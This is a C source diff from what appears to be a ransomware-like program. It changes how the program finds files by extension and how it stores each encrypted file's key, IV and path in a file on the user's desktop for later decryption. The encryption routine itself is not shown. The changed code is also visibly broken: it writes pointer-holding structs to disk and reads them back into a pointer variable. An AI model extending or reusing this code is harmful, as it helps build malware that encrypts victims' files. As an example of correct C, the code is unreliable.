@@ -40,7 +40,7 @@ void find_files(List **files, char* start_path){
                 while(ext != NULL){
 
                     if(strcmp(get_filename_ext(path_to_file), ext) == 0){
-                        append(files, path_to_file);
+                        append(files, path_to_file, NULL, NULL);
                         break;
                     }
                     ext = strtok(NULL, " ");
@@ -66,62 +66,58 @@ void find_files(List **files, char* start_path){
 
 /**
  * This function will save all keys, iv's and path's from each successfull
- * encrypted file in the file named: "enc_files.json" on the user's desktop.
+ * encrypted file in the file named: "enc_files.gc" on the user's desktop.
  * This file will be used to decrypt.
  * @param l -> type = EncList
  */
-void save_into_file_encrypted_list(EncList *l, char * start_path){
+void save_into_file_encrypted_list(List *l, char * start_path){
     FILE *f;
-    strcat(start_path, "enc_files.json");
+    strcat(start_path, "enc_files.gc");
     f = fopen(start_path, "wb");
-    char *line;
     int status;
+    
     while(l != NULL){
-        /*"{'key': '%s', 'iv':'%s', 'path':'%s'}\n"*/
-
-        line = (char *)malloc(strlen(l->iv) + strlen(l->key) + strlen(l->path) + strlen("{'key':'', 'iv':'', 'path':''}") + 3);
-        strcat(line, "{'key':'");
-        strcat(line, l->key);
-        strcat(line, "', 'iv':'");
-        strcat(line, l->iv);
-        strcat(line, "', 'path':'");
-        strcat(line, l->path);
-        strcat(line, "'}\n");
-        status = fwrite(line, strlen(line), 1, f);
-        memset(line, 0, strlen(line)); // clear the string
+        
+        status = fwrite(l, sizeof(List), 1, f);
         l = l->prox;
     }
-    free(line);
     fclose(f);
 }
 
 /**
- * This function will open the file "enc_files.json" that contains the key, iv
+ * This function will open the file "enc_files.gc" that contains the key, iv
  * and path from each successfull encrypted file on the machine
  * Is used to append to the list all the encrypted files.
  * This list will be used to decrypt the files.
  * @param l -> type = EncList
  */
-void read_from_file_encrypted_files(EncList **l, char * start_path){ // funcao pra pegar nome do usuario
+void read_from_file_encrypted_files(List **l, char * start_path){ 
     FILE *f;
-    char *line = NULL;
-    char *key, *iv, *path;
+    List *temp;
     int status;
-    ssize_t read;
-    size_t len = 0;
-    strcat(start_path, "enc_files.json");
+    char *key, *iv, *path;
+    strcat(start_path, "enc_files.gc");
+    
     if(*l != NULL){
-        destroy_encrypted_list(l);
+        destroy(l);
+        
     }else if(*l == NULL){
         f = fopen(start_path, "rb");
         if(f != NULL){
-            while ((getline(&line, &len, f)) != -1) {
-                printf("%s", line); // key, iv and path in the line,
-
-
-                append_encrypted(l, path, key, iv);
+            
+            while(1){
+                
+                status = fread(&temp, sizeof(List), 1, f);
+                if(status != 1){
+                    if(feof(f)){
+                        fclose(f);
+                        return;
+                    }
+                }
+                append(l, temp[2], temp[0], temp[1]);
+                free(temp);
             }
-            free(line);
+            
             fclose(f);
         }
     }
@@ -159,7 +155,7 @@ char * get_start_path(){
 
 /**
  * This function will generate random string to be saved as key and iv.
- * @param length -> type = int
+ * @param length -> type = integer
  * @return -> type = char * (String)
  */
 char* generate_key(int length){
